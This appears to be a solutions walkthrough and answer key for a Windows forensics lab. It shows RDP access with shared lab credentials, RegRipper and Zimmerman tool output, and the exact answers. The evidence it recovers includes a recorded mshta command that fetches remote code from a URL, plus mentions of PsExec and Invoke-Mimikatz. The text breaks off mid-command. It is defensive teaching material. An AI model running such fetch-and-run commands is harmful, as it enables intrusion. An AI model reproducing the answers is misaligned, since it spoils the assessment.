Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `typedpaths` plugin, finding the path in the `url6` value in the output:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\009.typedpaths\exercise\NTUSER.DAT" -p typedpaths
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\009.typedpaths\exercise\NTUSER.DAT" -p typedpaths

Launching typedpaths v.20200526
typedpaths v.20200526
(NTUSER.DAT) Gets contents of user's typedpaths key

Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
LastWrite Time 2023-08-28 13:42:13Z

url1     C:\Users\John Doe\Documents\OneDrive_Backup
url2     C:\Users\John Doe\Documents\OneDrive_Backup\Pictures\20230102_00142.bmp
url3     C:\Users\John Doe\Documents\OneDrive\Pictures
url4     ftp://10.10.10.1/
url5     C:\Users\John Doe\Desktop\Tools\hidden\docs
url6     {hidden}
url7     C:\Users
```

Answer: `C:\Users\John Doe\Desktop\Tools\hidden\docs\passwords.rtf`

# MS Office Accessed Files (File MRU)

## Question 1

### "Use Registry Explorer or RegRipper to open the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\010.msoffice\\NTUSER.DAT". What is the full path of the file name mentioned in PowerPoint - File MRU? The answer format is C:\\*****\\********\\*******\\******************\\********\*\*\*.ppt"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-iah4woglab]─[~]
└──╼ [★]$ xfreerdp /v:10.129.137.20 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.137.20:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `msoffice` plugin, finding the path in the `PowerPoint - File MRU` value in the output:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\010.msoffice\NTUSER.DAT" -p msoffice
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\010.msoffice\NTUSER.DAT" -p msoffice

Launching  msoffice v.20200518
msoffice v.20200518

Word - File MRU
2023-11-22 13:27:02Z: C:\Users\John Doe\Desktop\Copied_from_server\August_SOA.doc

Word - Place MRU
2023-11-22 13:27:02Z: C:\Users\John Doe\Desktop\Copied_from_server\

PowerPoint - File MRU
2023-11-22 13:27:25Z: {hidden}

<SNIP>
```

Answer: `C:\Users\John Doe\Desktop\Copied_from_server\new_project.ppt`

# Adobe Recent Files

## Question 1

### "Examine the Adobe Recently Accessed Files from the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\017.adobe\\NTUSER.DAT" using RegRipper or Registry Explorer. What is the name of the file that starts with "f"? The answer format is \*\*\*\*\*\*\*\*\*.pdf"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-iah4woglab]─[~]
└──╼ [★]$ xfreerdp /v:10.129.224.136 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.224.136:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `adobe` plugin, finding the name of the file in the `c3` key name:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\017.adobe\NTUSER.DAT" -p adobe
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\017.adobe\NTUSER.DAT" -p adobe
Launching adobe v.20200522
adobe v.20200522
(NTUSER.DAT) Gets user's Adobe app cRecentFiles values

Software\Adobe\Adobe Acrobat\DC\AVGeneral\cRecentFiles
Key name,file name,sDate,uFileSize,uPageCount
c1,/C/Users/John Doe/Downloads/W8-Form.pdf ,20231123053506-08'00' ,7945,1
c2,/C/Users/John Doe/Downloads/new_projects.pdf ,20231123053321-08'00' ,7945,1
c3,/C/Users/John Doe/Downloads/{hidden} ,20231123053314-08'00' ,7945,1
c4,/C/Users/John Doe/Downloads/ClientDetails.pdf ,20231123053305-08'00' ,7945,1
c5,/C/Users/John Doe/Downloads/employees_details.pdf ,20231123053252-08'00' ,7945,1
c6,https://www.adobe.com/go/homeacrordrunified18_2018 ,20231123053234-08'00' ,,

Could not access Software\Adobe\Acrobat Reader\\AVGeneral\cRecentFiles
```

Answer: `forbidden.pdf`

# User's sticky notes forensics

## Question 1

### "Parse the SQLite file using DB Browser for SQLite or StickyParser. What is the password value present in the Sticky Notes database file? The answer format is *******secret*******\*"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-iah4woglab]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.125 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.229.125:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\StickyParser`, and use the `stickyparser.py` Python script to parse the `plum.sqlite` database file and output the results in the `C:\Temp` directory:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\StickyParser
py stickyparser.py -p C:\Tools\DFIR-Data\evidence\011.stickynotes\plum.sqlite -d C:\Temp
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\StickyParser
PS C:\Tools\DFIR-Data\Tools\StickyParser> py stickyparser.py -p C:\Tools\DFIR-Data\evidence\011.stickynotes\plum.sqlite -d C:\Temp

StickyPraser: Parsing the sqlite file ....
StickyParser: Saving the csv file
StickyParser: File saved.
```

Next, students will scrutinize the generated CSV file in the `C:\Temp` directory, finding the password in the output:

Code: powershell

```powershell
dir C:\Temp
cat C:\Temp\stickynoteresultplum-202410180639.csv
```

```
PS C:\Tools\DFIR-Data\Tools\StickyParser> dir C:\Temp

    Directory: C:\Temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/18/2024   6:39 AM           1140 stickynoteresultplum-202410180639.csv
-a----        3/19/2022   5:56 AM           2381 unattended2.xml

PS C:\Tools\DFIR-Data\Tools\StickyParser> cat C:\Temp\stickynoteresultplum-202410180639.csv

Text,WindowPosition,IsOpen,IsAlwaysOnTop,CreationNoteIdAnchor,Theme,IsFutureNote,RemoteId,ChangeKey,LastServerVersion,RemoteSchemaVersion,IsRemoteDataInvalid,PendingInsightsScan,Type,Id,ParentId,CreatedAtUTC,DeletedAtUTC,UpdatedAtUTC
"\id=ac1dffd4-c1cb-4685-b704-a32d300c1ab1 Copy files from HTBFS01
\id=bde33da8-9791-43c4-8b9d-f86823919f0f Domain administrator
\id=b8e4c8d5-8d9f-480a-8955-c49b20756581 username: administrator
\id=55609ae0-8a03-4219-a491-6cd3c373163d password: {hidden}","ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&427137e&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=885,184;Size=320,320",1,0,,Yellow,0,,,,,,0,,e8ca49c4-8168-4623-b731-ee75435241dc,ce199095-63f3-42aa-8a3e-74430930baed,2023-11-22 13:40-29,,2023-11-22 13:42-28
<SNIP>
```

Answer: `thisisasecretpassword`

# Archive history

## Question 1

### "Examine the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\018.archive\_history\\NTUSER.DAT". Identify the string containing two file names in the sensitive.zip archive and use it as the answer. The answer format is *********\_*******.txt:**\*\*\*\*\*\*\*.tx"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.62]─[htb-ac-8414@htb-iah4woglab]─[~]
└──╼ [★]$ xfreerdp /v:10.129.9.193 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.9.193:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `winzip` plugin, finding the files in the output next to the `35ec3dcb-22e0-4fad-b941-06e0f37873fe` GUID:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r 'C:\Tools\DFIR-Data\evidence\018.archive_history\NTUSER.DAT' -p winzip
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r 'C:\Tools\DFIR-Data\evidence\018.archive_history\NTUSER.DAT' -p winzip

Launching WinZip v.20200526
winzip v.20200526
(NTUSER.DAT) Get WinZip extract and filemenu values

<SNIP>

2     C:\Users\John Doe\Downloads\Compressed\sensitive.zip
xd2   0{35ec3dcb-22e0-4fad-b941-06e0f37873fe}{35ec3dcb-22e0-4fad-b941-06e0f37873fe}{35ec3dcb-22e0-4fad-b941-06e0f37873fe}{hidden}{35ec3dcb-22e0-4fad-b941-06e0f37873fe}2{35ec3dcb-22e0-4fad-b941-06e0f37873fe}28:34{35ec3dcb-22e0-4fad-b941-06e0f37873fe}{35ec3dcb-22e0-4fad-b941-06e0f37873fe}{35ec3dcb-22e0-4fad-b941-06e0f37873fe}
```

Answer: `important_numbers.txt:passwords.txt`

# Command-line history forensics

## Question 1

### "Examine the console history file located at "C:\\Tools\\DFIR-Data\\evidence\\012.cmd-history\\ConsoleHost\_history.txt". Identify the URL mentioned in the mshta command. Use the URL as the answer. The answer format is https://*******.co//****/\*\*\*\*\*\*\*\*/**H*****\*\*\*\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.47]─[htb-ac-8414@htb-h1qlp5c6rd]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.125 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.229.125:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell and query the contents of the `C:\Tools\DFIR-Data\evidence\012.cmd-history\ConsoleHost_history.txt` PowerShell command history file to find the URL used within the `mshta` command:

Code: powershell

```powershell
cat C:\Tools\DFIR-Data\evidence\012.cmd-history\ConsoleHost_history.txt
```

```
PS C:\Users\Administrator> cat C:\Tools\DFIR-Data\evidence\012.cmd-history\ConsoleHost_history.txt

<SNIP>

mshta {hidden}
Remove-Item "C:\Users\John Doe\Downloads\stickynotes.txt"
Clear-History\`

Clear-History
Get-History
Clear-History
exit
```

Answer: `https://textdoc.co//home/download/2YH61Er9JM7PysGV`

# Command-line history forensics

## Question 2

### "Open the PowerShell console history file located at "C:\\Tools\\DFIR-Data\\evidence\\012.cmd-history\\ConsoleHost\_history.txt". Identify the name of an executable file (ending with .exe) mentioned. Use the name of the executable file as the answer. The answer format is P\*\*\*\*\*.exe"

Students will reuse the previously established RDP session and will query the contents of the `C:\Tools\DFIR-Data\evidence\012.cmd-history\ConsoleHost_history.txt` PowerShell command history file to find the executable:

Code: powershell

```powershell
cat C:\Tools\DFIR-Data\evidence\012.cmd-history\ConsoleHost_history.txt
```

```
PS C:\Users\Administrator> cat C:\Tools\DFIR-Data\evidence\012.cmd-history\ConsoleHost_history.txt

<SNIP>

Get-ChildItem -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\"|select -ExpandProperty Name
psexec
.\{hidden}.exe
cd C:\Tools\
.\Invoke-Mimikatz.ps1
```

Answer: `PsExec.exe`

# Saved SSH keys and server information (Putty)

## Question 1

### "Using RegRipper, process the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\014.sshHostKeys\\NTUSER.DAT" with the PuTTY plugin. In the output, identify the registry path where PuTTY SSH keys information is stored. The answer format is Software\\***********\\*****\\******\*\*\*\*\*"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.47]─[htb-ac-8414@htb-h1qlp5c6rd]─[~]
└──╼ [★]$ xfreerdp /v:10.129.14.140 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.14.140:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `putty` plugin, finding the registry path for storing credentials in PuTTY:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\014.sshHostKeys\NTUSER.DAT" -p putty
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\014.sshHostKeys\NTUSER.DAT" -p putty

Launching putty v.20200515
putty v.20200515
(NTUSER.DAT) Extracts the saved SshHostKeys for PuTTY.

PuTTY
Software\{hidden}
LastWrite Time 2023-11-23 12:58:16Z

ssh-ed25519@22:10.10.10.4 -> 0x7bca6d79bb73ff0328ce9408ddac4e19da8e94510e61c9d11f88712524a890a9,0x3cc9ba18238b76c76c4b1b4c6ae0051c418cf947458d82a58d02e94ba1a46216
```

Answer: `Software\SimonTatham\PuTTY\SshHostKeys`

# Terminal Server history (tsclient)

## Question 1

### "Examine the NTUSER.DAT file located at "C:\\Tools\\DFIR-Data\\evidence\\016.tsclient\\exercise\\NTUSER.DAT". What is the IP address of the remote server the user interacted with? The answer format is ***.***.***.***"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.47]─[htb-ac-8414@htb-h1qlp5c6rd]─[~]
└──╼ [★]$ xfreerdp /v:10.129.177.208 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.177.208:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `NTUSER.DAT` registry hive with the `tsclient` plugin, finding the IP address of the remote server:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\016.tsclient\exercise\NTUSER.DAT" -p tsclient
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\016.tsclient\exercise\NTUSER.DAT" -p tsclient

Launching tsclient v.20200518
Launching tsclient v.20200518
(NTUSER.DAT) Displays contents of user's Terminal Server Client\Default key

TSClient
Software\Microsoft\Terminal Server Client\Default
LastWrite Time 2023-08-28 13:42:50Z
  MRU0 -> {hidden}

<SNIP>
```

Answer: `192.168.182.239`

# Terminal Server history (tsclient)

## Question 2

### "In the same output, what is the value of UsernameHint? The answer format is *******\\*******\*\*\*\*\*\*"

Students will reuse the previously established RDP session and will scrutinize the output from the previous question (command) to find the value of `UsernameHint`:

```
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\016.tsclient\exercise\NTUSER.DAT" -p tsclient

Launching tsclient v.20200518
Launching tsclient v.20200518
(NTUSER.DAT) Displays contents of user's Terminal Server Client\Default key

<SNIP>

{hidden}  LastWrite time: 2023-08-28 13:42:49Z
  UsernameHint: {hidden}
```

Answer: `HTBVM01\administrator`

# ActivityCache.db

## Question 1

### "Use WxTCmd.exe to parse the ActivitiesCache.db file located at "C:\\Tools\\DFIR-Data\\evidence\\015.activityCache\\ActivitiesCache.db" and save the output to the C:\\tmp location. Then, open the Activity CSV file in Timeline Explorer. In the content info, apply a filter for exe files and use the name of the executable file as the answer. The answer format is \*\*\*\*\*\*\*.exe"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.47]─[htb-ac-8414@htb-mbeefrtd7j]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.125 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.229.125:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6`, use `WxTCmd.exe` to parse the database in the `C:\Tools\DFIR-Data\evidence\015.activityCache` directory, and save the output in the `C:\tmp` directory in the form of CSV:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
.\WxTCmd.exe -f C:\Tools\DFIR-Data\evidence\015.activityCache\ActivitiesCache.db --csv C:\tmp
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\WxTCmd.exe -f C:\Tools\DFIR-Data\evidence\015.activityCache\ActivitiesCache.db --csv C:\tmp
WxTCmd version 1.0.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/WxTCmd

Command line: -f C:\Tools\DFIR-Data\evidence\015.activityCache\ActivitiesCache.db --csv C:\tmp

ActivityOperation entries found: 0
Activity_PackageId entries found: 764
Activity entries found: 253

Results saved to: C:\tmp

Processing complete in 0.7000 seconds

Unable to delete SQLite.Interop.dll. Delete manually if needed
```

Next, students will navigate to the `TimelineExplorer` sub-directory and use `TimelineExplorer` to analyze the generated CSV file:

Code: powershell

```powershell
cd TimelineExplorer
.\TimelineExplorer.exe
```

```
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> cd .\TimelineExplorer\
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6\TimelineExplorer> .\TimelineExplorer.exe
```

Students will click on `File` -> `Open`, then navigate to the `C:\tmp` directory and open the `_Activity.csv` file:

![[HTB Solutions/Others/z. images/14b0a00e7341daf0f00cb3405de70565_MD5.webp]]

Students will scroll to the left to the `Content Info` column and will use the string `exe` for the filter, finding out the name of the executable in the results:

![[HTB Solutions/Others/z. images/0af7722e9acb5e8dc5706b53102759f1_MD5.webp]]

Answer: `malware.exe`

# USB Devices

## Question 1

### "Using RegRipper or Registry Explorer, load the SYSTEM file located at "C:\\Tools\\DFIR-Data\\evidence\\019.usb-devices\\exercise\\SYSTEM" and identify the name of the USB device. Use the name as the answer. The answer format is King\*\*\*\*\*\*************2************e"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.47]─[htb-ac-8414@htb-mbeefrtd7j]─[~]
└──╼ [★]$ xfreerdp /v:10.129.226.159 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.226.159:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\RegRipper`, and use `rip.exe` (RegRipper) to scrutinize the `SYSTEM`registry hive with the `usbstor` plugin, finding the name of the USB device in the `FriendlyName` variable:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\RegRipper
.\rip.exe -r "C:\Tools\DFIR-Data\evidence\019.usb-devices\exercise\SYSTEM" -p usbstor
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools\DFIR-Data\Tools\RegRipper
PS C:\Tools\DFIR-Data\Tools\RegRipper> .\rip.exe -r "C:\Tools\DFIR-Data\evidence\019.usb-devices\exercise\SYSTEM" -p usbstor

Launching usbstor v.20200515
usbstor v.20200515
(System) Get USBStor key info

USBStor
ControlSet001\Enum\USBStor

Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP [2022-02-28 17:52:27]
  S/N: 1C6F654E59A3B0C039D32E71&0 [2022-02-28 17:52:27Z]
  Device Parameters LastWrite: [2022-02-28 17:52:27Z]
  Properties LastWrite       : [2022-02-28 17:52:27Z]
    FriendlyName          : {hidden}
    First InstallDate     : 2022-02-28 17:52:27Z
    InstallDate           : 2022-02-28 17:52:27Z
    Last Arrival          : 2022-02-28 17:52:27Z
    Last Removal          : 2022-02-28 17:53:37Z
```

Answer: `Kingston DataTraveler 2.0 USB Device`

# USB Devices

## Question 2

### "Using LECmd.exe, process the LNK file located at "C:\\Tools\\DFIR-Data\\evidence\\019.usb-devices\\exercise\\Board Presentation.lnk". In the output, locate the Tracker database block and identify the Machine ID. Use it as the answer. The answer format is \*\*\*\*-\*\*2"

Students will reuse the previously established RDP session and will navigate to the `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6` and use `LECmd.exe`, scrutinizing the `Board Presentation.lnk` file, finding the machine ID:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
.\LECmd.exe -f "C:\Tools\DFIR-Data\evidence\019.usb-devices\exercise\Board Presentation.lnk"
```

```
PS C:\Tools\DFIR-Data\Tools\RegRipper> cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
PS C:\Tools\DFIR-Data\Tools\EZ-Tools\net6> .\LECmd.exe -f "C:\Tools\DFIR-Data\evidence\019.usb-devices\exercise\Board Presentation.lnk"

LECmd version 1.5.0.0

Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/LECmd

Command line: -f C:\Tools\DFIR-Data\evidence\019.usb-devices\exercise\Board Presentation.lnk

Processing C:\Tools\DFIR-Data\evidence\019.usb-devices\exercise\Board Presentation.lnk

<SNIP>

--- Extra blocks information ---

>> Tracker database block
   Machine ID:  {hidden}
   MAC Address: 04:ed:33:5e:f6:c7
   MAC Vendor:  (Unknown vendor)
   Creation:    2022-02-28 17:25:19

   Volume Droid:       00000000-0000-0000-0000-000000000000
   Volume Droid Birth: 00000000-0000-0000-0000-000000000000
   File Droid:         66ba78ea-98bb-11ec-a11e-04ed335ef6c7
   File Droid birth:   66ba78ea-98bb-11ec-a11e-04ed335ef6c7

<SNIP>
```

Answer: `gary-pc2`

# Skills Assessment

## Question 1

### "Using LECmd.exe, perform an analysis on the LNK file located at the path: "C:\\Tools\\DFIR-Data\\evidence\\skills-assessment\\D\\Users\\gary\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\McWhiskey Acquisition Expected Q4 2022.lnk". In the LECmd output, go to the "Network share information" and find the share name. The answer format is \\\\\*******\\******"

After spawning the target machine, students will establish an RDP session using the credentials `Administrator:Password123`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:Password123 /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.47]─[htb-ac-8414@htb-nbpkhzwpyk]─[~]
└──╼ [★]$ xfreerdp /v:10.129.76.131 /u:Administrator /p:Password123 /dynamic-resolution 

<SNIP>

Certificate details for 10.129.76.131:3389 (RDP-Server):
	Common Name: DFIR
	Subject:     CN = DFIR
	Issuer:      CN = DFIR
	Thumbprint:  bb:13:51:21:ce:22:8f:0b:a3:c1:0a:37:7f:fe:b3:15:a0:91:f0:a5:df:52:f4:e5:b2:10:6e:94:49:c3:e5:19
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open PowerShell, navigate to `C:\Tools\DFIR-Data\Tools\EZ-Tools\net6`, use `LECmd.exe` to scrutinize the `McWhiskey Acquisition Expected Q4 2022.lnk` file, finding the network share information in the `Share name` variable in the output:

Code: powershell

```powershell
cd C:\Tools\DFIR-Data\Tools\EZ-Tools\net6
